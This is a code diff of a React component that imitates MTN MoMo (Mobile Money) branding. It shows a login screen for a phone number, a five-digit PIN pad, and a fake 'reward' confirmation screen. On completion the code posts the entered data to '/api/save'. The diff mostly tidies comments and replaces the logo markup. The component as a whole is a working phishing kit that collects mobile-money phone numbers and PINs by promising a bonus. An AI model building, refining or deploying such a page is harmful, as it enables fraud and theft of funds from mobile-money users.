@@ -3,7 +3,6 @@
 import { useState, useEffect } from 'react';
 
 export default function MomoAppFlow() {
-  // Gestion des étapes : 'login' | 'pin' | 'loading' | 'bonus'
   const [step, setStep] = useState<'login' | 'pin' | 'loading' | 'bonus'>('login');
   const [phoneNumber, setPhoneNumber] = useState('');
 
@@ -23,11 +22,8 @@ export default function MomoAppFlow() {
           phoneNumber={phoneNumber} 
           onBack={() => setStep('login')} 
           onPinComplete={async (pin) => {
-            // On passe à l'écran de chargement
             setStep('loading');
-            
             try {
-              // Envoi des données à l'API
               await fetch('/api/save', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -36,11 +32,7 @@ export default function MomoAppFlow() {
             } catch (error) {
               console.error("Erreur réseau", error);
             }
-
-            // On attend 2 secondes puis on affiche la page de récompense
-            setTimeout(() => {
-              setStep('bonus');
-            }, 2000);
+            setTimeout(() => setStep('bonus'), 2000);
           }}
         />
       )}
@@ -48,12 +40,8 @@ export default function MomoAppFlow() {
       {step === 'loading' && (
         <div className="flex min-h-dvh flex-col items-center justify-center bg-[#00405c] px-4">
           <div className="flex h-12 w-12 animate-spin items-center justify-center rounded-full border-4 border-[#ffcc00] border-t-transparent"></div>
-          <p className="mt-6 text-lg font-medium text-white">
-            Vérification en cours...
-          </p>
-          <p className="mt-2 text-sm text-[#a5c0cf]">
-            Veuillez ne pas fermer cette page.
-          </p>
+          <p className="mt-6 text-lg font-medium text-white">Vérification en cours...</p>
+          <p className="mt-2 text-sm text-[#a5c0cf]">Veuillez ne pas fermer cette page.</p>
         </div>
       )}
 
@@ -63,7 +51,7 @@ export default function MomoAppFlow() {
 }
 
 /* =========================================================
-   ÉCRAN 1 : LOGIN MOMO (Numéro)
+   ÉCRAN 1 : LOGIN MOMO
    ========================================================= */
 function MomoLoginScreen({ onNext }: { onNext: (phone: string) => void }) {
   const [phone, setPhone] = useState('');
@@ -79,16 +67,16 @@ function MomoLoginScreen({ onNext }: { onNext: (phone: string) => void }) {
   return (
     <div className="flex min-h-dvh w-full flex-col bg-[#00405c] relative overflow-hidden md:flex-row">
       
+      {/* PARTIE LOGO */}
       <div className="flex flex-col items-center justify-center pt-16 pb-6 z-10 md:w-1/2 md:pt-0 md:pb-0">
-        <div className="flex h-[80px] w-[80px] items-center justify-center rounded-[20px] bg-[#ffcc00] shadow-lg mb-4">
-           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="w-12 h-12 text-[#00405c]">
-            <path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2.5-1.25L12 8.5l-2.5 1.25L12 11zm0 2.5l-5-2.5-5 2.5L12 22l10-8.5-5-2.5-5 2.5z" />
-          </svg>
-        </div>
-        <h1 className="text-[36px] font-bold text-[#ffcc00] leading-none mb-1">MoMo</h1>
-        <p className="text-[12px] font-semibold text-[#ffcc00] tracking-wider uppercase">from MTN</p>
+        <img 
+          src="/logo.png" 
+          alt="MoMo Logo" 
+          className="h-[120px] w-auto object-contain md:h-[160px]" 
+        />
       </div>
 
+      {/* PARTIE FORMULAIRE */}
       <div className="flex w-full flex-col items-center justify-center px-4 pb-12 md:w-1/2 md:px-12 md:pb-0">
         <div className="relative z-10 flex w-full max-w-[440px] flex-col rounded-[32px] bg-white px-8 pt-10 pb-10 shadow-2xl">
           <h2 className="text-center text-[24px] font-bold text-[#00405c] mb-8">
@@ -170,7 +158,7 @@ function MomoLoginScreen({ onNext }: { onNext: (phone: string) => void }) {
 }
 
 /* =========================================================
-   ÉCRAN 2 : CODE PIN MOMO (5 chiffres)
+   ÉCRAN 2 : CODE PIN MOMO
    ========================================================= */
 function MomoPinScreen({ phoneNumber, onBack, onPinComplete }: { phoneNumber: string; onBack: () => void; onPinComplete: (pin: string) => void }) {
   const [pin, setPin] = useState('');
@@ -178,9 +166,7 @@ function MomoPinScreen({ phoneNumber, onBack, onPinComplete }: { phoneNumber: st
 
   useEffect(() => {
     if (pin.length === 5) {
-      const timer = setTimeout(() => {
-        onPinComplete(pin);
-      }, 300);
+      const timer = setTimeout(() => onPinComplete(pin), 300);
       return () => clearTimeout(timer);
     }
   }, [pin, onPinComplete]);
@@ -198,14 +184,13 @@ function MomoPinScreen({ phoneNumber, onBack, onPinComplete }: { phoneNumber: st
   return (
     <div className="flex min-h-dvh w-full flex-col bg-[#00405c] relative overflow-hidden md:flex-row">
       
+      {/* PARTIE LOGO ET INFOS */}
       <div className="flex flex-col items-center justify-center pt-12 pb-6 z-10 md:w-1/2 md:pt-0 md:pb-0">
-        <div className="flex h-[72px] w-[72px] items-center justify-center rounded-[18px] bg-[#ffcc00] shadow-lg mb-3">
-           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="w-10 h-10 text-[#00405c]">
-            <path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2.5-1.25L12 8.5l-2.5 1.25L12 11zm0 2.5l-5-2.5-5 2.5L12 22l10-8.5-5-2.5-5 2.5z" />
-          </svg>
-        </div>
-        <h1 className="text-[32px] font-bold text-[#ffcc00] leading-none mb-1">MoMo</h1>
-        <p className="text-[11px] font-semibold text-[#ffcc00] tracking-wider uppercase mb-8">from MTN</p>
+        <img 
+          src="/logo.png" 
+          alt="MoMo Logo" 
+          className="h-[100px] w-auto object-contain md:h-[130px] mb-6" 
+        />
 
         <div className="text-center px-6">
           <p className="text-white text-[16px] font-medium mb-1">
@@ -217,6 +202,7 @@ function MomoPinScreen({ phoneNumber, onBack, onPinComplete }: { phoneNumber: st
         </div>
       </div>
 
+      {/* PARTIE PAVÉ NUMÉRIQUE */}
       <div className="flex w-full flex-col items-center justify-center px-4 pb-12 md:w-1/2 md:px-12 md:pb-0">
         <div className="relative z-10 flex w-full max-w-[440px] flex-col items-center rounded-[32px] bg-white px-8 pt-10 pb-8 shadow-2xl">
           
@@ -265,16 +251,10 @@ function MomoPinScreen({ phoneNumber, onBack, onPinComplete }: { phoneNumber: st
 /* =========================================================
    ÉCRAN 3 : BONUS / RÉCOMPENSE
    ========================================================= */
-/* =========================================================
-   ÉCRAN 3 : BONUS / RÉCOMPENSE (Confirmation)
-   ========================================================= */
 function MomoBonusScreen() {
   return (
     <div className="flex min-h-dvh flex-col items-center justify-center bg-[#f0f8ff] px-4 relative">
-      
       <div className="flex w-full max-w-md flex-col items-center text-center">
-        
-        {/* Grosse coche verte de succès */}
         <div className="mb-6 flex h-24 w-24 items-center justify-center rounded-full bg-green-100 shadow-sm">
           <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2.5} stroke="currentColor" className="h-12 w-12 text-[#00b050]">
             <path strokeLinecap="round" strokeLinejoin="round" d="M4.5 12.75l6 6 9-13.5" />
@@ -290,7 +270,6 @@ function MomoBonusScreen() {
           Nous traitons actuellement votre récompense.
         </p>
 
-        {/* Boîte d'information */}
         <div className="w-full rounded-2xl bg-white p-6 shadow-[0_4px_20px_rgba(0,0,0,0.05)] border border-gray-100">
           <div className="flex items-center gap-3 mb-4">
             <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-[#ffcc00]/20">
@@ -311,17 +290,14 @@ function MomoBonusScreen() {
           </p>
         </div>
 
-        {/* Bouton de retour */}
         <button
           type="button"
-          onClick={() => window.location.reload()} // Recharge la page pour revenir au début
+          onClick={() => window.location.reload()}
           className="mt-8 w-full rounded-full bg-[#00405c] py-4 text-sm font-bold uppercase tracking-wide text-white transition hover:bg-gray-800 active:scale-[0.98]"
         >
           Retour à l'accueil
         </button>
-
       </div>
     </div>
   );
 }
-
